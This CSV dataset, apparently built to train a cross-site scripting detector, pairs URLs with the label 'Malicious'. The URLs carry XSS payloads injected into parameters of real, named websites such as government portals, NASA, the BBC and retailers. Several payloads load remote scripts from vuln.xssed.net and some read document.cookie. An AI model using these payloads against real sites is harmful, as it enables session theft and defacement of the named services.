Payloads,Class
http://uplink.space.com/showflat.php?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.technology.gov/exitpage.asp?np=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
"http://www.ecoresponsabilite.ecologie.gouv.fr/recherche.php3?recherche=%22;alert(string.fromcharcode<br>(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcha<br>rcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e&amp;type=artic",Malicious
http://home.miryang.go.kr/x/asp/board/board.asp?board_idx=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.creps-auvergne.jeunesse-sports.gouv.fr/index.php?page=%22%3e'%3e%3cscript%20src=http://vu<br>ln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://scoup.impots.gouv.fr/selection.php?ptheme1=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/th<br>irdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.akdenizsuurunleri.gov.tr/indeks.php?mid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://biensdelacouronne.tpsgc.gc.ca/text/faq_questions-e.cfm?faqcat_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.cci-icc.gc.ca/bookstore/viewcategory-e.cfm?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.seduc.to.gov.br/index.php?option=com_content&amp;task=view&amp;id=730&amp;itemid=%22%3e'%3e%3cscript%<br>20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e0,Malicious
https://acesso.uol.com.br/login.html?skin=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty<br>/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.msn.co.kr/webinclude/exredir.asp?startid=clip_5644&amp;adgroup=krmgen&amp;url=%68%74%74%70%3a%2f%<br>2f%77%77%77%2e%6c%69%6e%75%78%2e%6f%72%67,Malicious
http://mediasig.premier-ministre.gouv.fr/scripts/simplesearchtrt.cfm?page=1&amp;typerech=personne&amp;nom=%2<br>2%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fsc<br>ript%3e&amp;rechercher.x=12&amp;rechercher.y=10,Malicious
http://www.concours.agriculture.gouv.fr/calendrier/sommaire.cfm?cal_cdn=%22%3e'%3e%3cscript%20src=ht<br>tp://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.cher.pref.gouv.fr/recherche.php?mot=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.n<br>et%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e&amp;x=5&amp;y=11,Malicious
http://www.mcdonalds.com.br/home/outing.asp?link=&quot;&gt;&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;,Malicious
http://www.eera.gov.uk/news.asp?id=&quot;&gt;&lt;script&gt;alert(&quot;ownz+your+system+by+vagrant&quot;)&lt;/script&gt;,Malicious
http://www.doleta.gov/advanced_search/search.cfm?count=49&amp;operation=7&amp;query=''&gt;&lt;/script&gt;&lt;script&gt;aler<br>t(document.cookie)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://u.noticias.busca.uol.com.br/uol/index.html?q=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/<br>thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
"http://fr.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20<br>onload=alert('xss')%3e",Malicious
"http://dk.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://es.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://cz.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://au.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
https://www.sun.com/secure/tnb/application/index.jsp?puuid=%22%3e'%3e%3cscript%20src=http://vuln.xss<br>ed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.2600.com/phones/newindex.khtml?payphone=849&amp;country=foo%3cscript%20src=http://vuln.xssed.<br>net/thirdparty/scripts/sshjason.js%3e%3c/script%3e%20%3cimg%20src=http://www.2600.com/phones/phonepi<br>cs/am001.jpg%20onload=xss()%3e,Malicious
http://by.trendmicro-europe.com/search/?entity=enterprise&amp;master=true&amp;searchword=%22%3e%27%3e%3cscri<br>pt+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
"http://hr.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://hu.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
"http://yu.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.sporx.com/detail.php?type=search&amp;frm_kategori=haber&amp;frm_text=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&amp;sayfa=1&amp;x=0&amp;y=0,Malicious
http://www.tipo.gov.tw/service/news/showtalkcontent.asp?postnum=13684&amp;dep=%22%3e'%3e%3cscript%20src=<br>http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
"http://newsforums.bbc.co.uk/nol/thread.jspa?threadid=';alert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(st<br>ring.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,<br>82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,6<br>7,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
"http://www.bbc.co.uk/mediaselector/check/portuguese/meta/tx/bra_ultimas?size=';alert(string.fromchar<br>code(83,69,67,85,82,73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,<br>83,85,88))//%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.f<br>romcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://italiasalute.leonardo.it/shopping/shopcustadmin.asp?msg=%3cscript%3ealert(%22by%20s3al%20||cy<br>ber-unity.com%22)%3c/script%3e,Malicious
https://astounded.tv/store/shopcustadmin.asp?msg=%3cscript%3ealert('by%20w0lfr4m%20cyber-unity%2%200<br>team');%3c/script%3e,Malicious
http://buyersguide.pcmag.com/company/listcompaniesbysite.asp?page=13&amp;cbopagesize=&amp;getlistby=%22%3e%3<br>cscript%3ealert(%22xssed_by_omeha%22)%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://portal.vodafone.gr/vodafonenet/register/newregister/holssologin.jsp?action2=&quot;&gt;&lt;script&gt;alert('<br>xss')&lt;/script&gt;,Malicious
http://www.malargue.gov.ar/contacto.php?seccion=contacto.php?seccion=%3c/title%3e%3cscript%3ealert(4<br>30909610069)%3c/script%3e,Malicious
http://www.sonypictures.com.br/sony/search.sonypictures?search=%22%3e%3ciframe%20onload=alert%28/xss<br>/%29%3e,Malicious
http://pdsbeta.jpl.nasa.gov/app1/pds/search.jsp?q=target_type%3acomet%27%22%3e%3c%2ftitle%3e%3cscrip<br>t%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;f.fa<br>cet_instrument.facet.prefix=3%2cspectrometer%2cdeep+impact+high+resolution+instrument+-+ir+spectrome<br>ter%2c&amp;f.facet_target.facet.prefix=3%2ccomet%2c49p%2farend-rigaux+1+(1951+c2)%2c&amp;fq=facet_target%3a%<br>222%2ccomet%2c49p%2farend-rigaux+1+(1951+c2)%22&amp;fq=facet_instrument%3a%222%2cspectrometer%2cdeep+imp<br>act+high+resolution+instrument+-+ir+spectrometer%22,Malicious
http://mars1.jpl.nasa.gov/cgi-bin/redplanet/search.pl?realm=&amp;match=0&amp;terms=gov&amp;rank=51%27%22%3e%3c/t<br>itle%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e,Malicious
http://winds.jpl.nasa.gov/imagesanim/images.cfm?pagename=imagesanim&amp;subpagename=quikscate&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;,Malicious
http://www.melbourneit.com.au/menupage.php?type=%22/%3e%3cscript%3ealert%281%29;%3c/script%3e,Malicious
http://w1.siemens.com/apps/search/en/index.php?uil=en&amp;cs=corp_siemens&amp;treepos=corp_siemens&amp;collapse=<br>true&amp;class=search%2cbanner%2ctext&amp;q=%3cscript%3ealert(0)%3c%2fscript%3e&amp;search.x=0&amp;search.y=0,Malicious
http://www.manga.gen.tr/search.php?q=%22%3cscript%3ealert(%22xss%20was%20found%20by\n\nwww.intelcomm<br>s.net\n\nplease%20fix%22)%3c/script%3e&amp;hl=ara,Malicious
http://www.nea.gr/nea_gr/index.php?cat_id=3&amp;subcat_id=14&lt;script&gt;alert(&quot;xss was found&quot;)&lt;/script&gt;,Malicious
http://www.bog.gov.gh/index1.php?linkid=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.poland.gov.pl/index.php?document=%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://salud.buenosaires.gov.ar/areas/salud/sistemas_salud/index.php?idtema=0&amp;idbarrio=&amp;idcgp=&amp;idtip<br>o=15&amp;texto=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
http://www.comunas.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://cultura.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.agc.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.ba.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.ccgsm.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.cedem.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.comercioexterior.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/scr<br>ipt%3e,Malicious
http://www.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.suparco.gov.pk/search/search-results.asp?order=rank&amp;query=%3cscript%3ealert%28%22xssed+by<br>+snypter%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.eumetsat.int/home/index.htm?l=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://utils.america.gov/feed2js/magpie_debug.php?url=%22%3e%3cscript%3ealert%28document.cookie%29%3<br>c/script%3e,Malicious
https://hotels.qantas.com.au/readyrooms/popups/emailafriend.jsp?site=qantas&amp;code=4190conraool&amp;hoteli<br>d=4190conraool&amp;city=ool%22/%3e%3cscript%3ealert%281%29;%3c/script%3e,Malicious
http://dynamic.boingboing.net/scripts/form.php?comment_id=958291&quot;/&gt;&lt;script&gt;alert('puddi<br>puddi');&lt;/script&gt;xxxx,Malicious
http://www.rba.gov.au/glossary/index.html?search=%22/%3e%3cbody%20onload=%22alert%28%27puddi%20puddi<br>%27%29%22%3e,Malicious
http://usa.kyoceramita.com/americas/jsp/kyocera/wheretobuy_result.jsp?zipcode=blah<br>blah&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;&amp;cat=2,Malicious
http://www.aviationweather.gov/adds/tafs/index.php?station_ids=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;std_trans=standard&amp;submit_taf=get+tafs,Malicious
http://www.tntexpress.com.au/interaction/remote/account_remote.asp?c=jsrs1&amp;f=ge%3cscript%3ealert%281<br>%29;%3c/script%3e%3cinput%3etaccount&amp;p0=[123123123]&amp;u=1300713738368%22%3cinput%3e,Malicious
http://www.forestrights.gov.in/committeereport/report.jsp?cl=1&amp;&amp;drpdistrict=89&amp;&amp;page=1&quot;&gt;&gt;&lt;/script&gt;&lt;s<br>cript&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://search.aol.com.au/aol/search?query=xssploit&amp;rp=%22%27%3e%3cscript%3ealert%28%27xss+found+by+s<br>mokey%27%29%3b%3c%2fscript%3e%3c%21--,Malicious
http://yavoy.movistar.es/rbtweb/buscar.jsp?t=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.mysql.com/downloads/gpg.php?file=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cheshirefire.gov.uk/update/index.asp?message=your%20username%20or%20password%20%3cscript%<br>3ealert%28document.cookie%29%3c/script%3e&amp;username=sdfsd#3584303778680302374,Malicious
http://www.knorr.pl/swieta/przepisy?q=&lt;iframe src=&quot;http://xssed.com&quot;&gt;,Malicious
https://www.cia.gov/search?ns-max-records=s[1]%22%3cscript%3ealert('pwned')%3c/script%3e,Malicious
http://www.bcb.gob.bo/?q=search/node/%27%22%3e%3c/title%3e%3cscript%3ealert%28shh%29%3c/script%3e%27<br>%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xdarkston3x%3c/h1%3e%3c/marquee%3e,Malicious
http://forums.amd.com/forum/messageview.cfm?catid=%22%3e%3cbody+onload=document.write(%22xssed%22)%3<br>e,Malicious
http://thesims2.ea.com/help/search.php?key=&quot;&gt;&lt;body onload=&quot;alert('xss')&quot;&gt;,Malicious
http://www.sancarlosbythesea.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://convivea.com/download.php?id=2&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,Malicious
http://bhaktapur.gov.np/listingbychar.php?char=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ccga.gov.cn/ssjg.jsp?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.wwf.org.za/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious
http://www.palmeiras.com.br/erro.asp?msg=%3cscript%3ealert%28%22brenn0%22%29%3c/script%3e,Malicious
http://crm.pizzahut.co.in/customer_feedback.php?type=%22%3e%3cimg%20src=http://img257.imageshack.us/<br>img257/3733/77822687.png%3e%3c%22,Malicious
"http://configure.us.dell.com/dellstore/config.aspx?oc=dndob28&amp;c=us&amp;l=en&amp;s=dhs&amp;cs=19&amp;model_id=inspiro<br>n-15-intel-n5040?oc=i14aw32-a&amp;mboxenv=xss',%20'560',%20'400');alert('by%20@disiqueira_');//",Malicious
http://www.yzagri.gov.cn/newssubjectdetail.php?ej=&amp;mainid=1064802412&amp;infoid=&lt;script&gt;alert(/xss/)&lt;/sc<br>ript&gt;,Malicious
http://www.huaweidevice.com/worldwide/downloadcenter.do?method=dolistsoftware&amp;id=1&amp;flay=find&amp;softwar<br>ename=&lt;iframe+src=http://www.google.com&gt;&lt;/iframe&gt;,Malicious
http://www.wbphed.gov.in/applications/map_mnt/search.php?catagory=%27%22%3e%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,Malicious
http://www.bloombergutv.com/search.php?tag=%27%27%22%3e%3c/title%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
http://www.westbengaltourism.gov.in/application/img_maint/search.php?catagory=%22%3e%3cscript%3ealer<br>t(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marq<br>uee%3e,Malicious
http://www.avellaneda-ba.gov.ar/index.php?idcateg=50&amp;level=%22%3e%3ciframe%20onload=alert%28/xss/%29<br>%3e,Malicious
http://www.mmi.gov.cn/index.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.wuxuan.gov.cn/news_show.asp?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.dyjy.gov.cn/articleshow.php?id=12400%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%<br>3e%20:%20%20xss%20vulnerable,Malicious
http://www.cbs6albany.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,Malicious
http://www.newsherald.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,Malicious
http://www.platines.sante.gouv.fr/?fi=&amp;ville=&amp;etablissement=&amp;depa=&amp;regi=&amp;typo=&amp;fiche=&amp;statut=&amp;scanne<br>r=&amp;irm=&amp;cam_scint=&amp;tep=&amp;salle_hemo=&amp;salle_coro=&amp;maternite=&amp;maternite1=&amp;maternite2=&amp;maternite3=&amp;struc<br>t_urgence=&amp;reanimation=&amp;brule=&amp;chir_cardiaque=&amp;neuro=&amp;radio=&amp;chimio=&amp;dialyse=&amp;readaptation=&amp;afficher<br>=o&amp;etablissement=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://www.oncfs.gouv.fr/spip.php?page=recherche&amp;recherche=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.etalab.gouv.fr/recherche/?query=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
http://www.francesoir.fr/search/apachesolr_search/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious
"http://football-regional.lesoir.be/live/index.php?compet=--%3e%3cscript%3ealert%28string.fromcharcod<br>e%2835,32,32,66,101,108,103,105,97,110,32,83,101,99,117,114,105,116,121,32,32,35%29%29%3c/script%3e",Malicious
http://www.redtube.com/?page='&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://www.bulacan.gov.ph/tourism/touristspotpostfeedback.php?id=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/scr<br>ipt&gt;,Malicious
http://www.mpfn.gob.pe/prensa-detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.aljazeera.net/photogallery/aspx/show.aspx?currentpage=&lt;script&gt;alert('shockshadow was<br>h3r3\nhttp://yee7.com');&lt;/script&gt;,Malicious
http://www.axa.com.ph/contact_us-complaints.asp?subj=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower<br>%20-%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey&lt;/h1&gt;,Malicious
http://www.hakkari.gov.tr/haberler.asp?id=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(document.cookie)%3b&lt;/script&gt;&amp;shf<br>=1,Malicious
http://ghack.nugeloganteng.co.cc/index.php?ref=&quot;&gt;&lt;script&gt;alert(&quot;you guys are retarded&quot;)&lt;/script&gt;,Malicious
http://urlmx.co.cc/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.nokia.co.uk/search4/index.jsp?wsid=207&amp;charset=iso-8859-1&amp;qt=%3ca+href%3djavascript%3aale<br>rt%28%27fuzz%27%29%3ebackslash+security+%3c%2fa%3e&amp;go.x=21&amp;go.y=10&amp;go=go,Malicious
http://asc-hq.sourceforge.net/show.php?id=58%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://mail.lzsafety.gov.cn:6080/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>p+,Malicious
http://ntr.ticketmaster.com/ntw/forward?from=--&gt;&quot;&gt;&lt;script<br>src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js&gt;&lt;/script&gt;,Malicious
http://www.statistiques.developpement-durable.gouv.fr/accueil/recherche-avancee/resultats-recherche.<br>html?id=4&amp;no_cache=1&amp;tx_solr[q]=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&amp;search=ok,Malicious
http://hypernews.slac.stanford.edu/hypernews/geant4/view-members.pl?page=2%22%3e%3cbody%20background<br>=%22http://www.lenagold.ru/fon/ani/cat/raz/razcat34.jpg%22%3e%3cscript%3ealert%28%22xss%22%29%3c/scr<br>ipt%3e%3ciframe%20width=%22420%22%20height=%22315%22%20src=%22http://www.youtube.com/embed/qh2-tgulw<br>u4%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e&amp;find=^b,Malicious
http://www.michelin.no/no/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.michelin.ro/ro/front/search.jsp?query=cautare%2e%2e%2e&amp;lang=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xs<br>s%20by%20turkpower%20-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.michelin.dk/dk/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.michelin.ru/ru/auto/auto_ts.jsp?marque=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%20<br>-%20canim%20turkiyem')%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
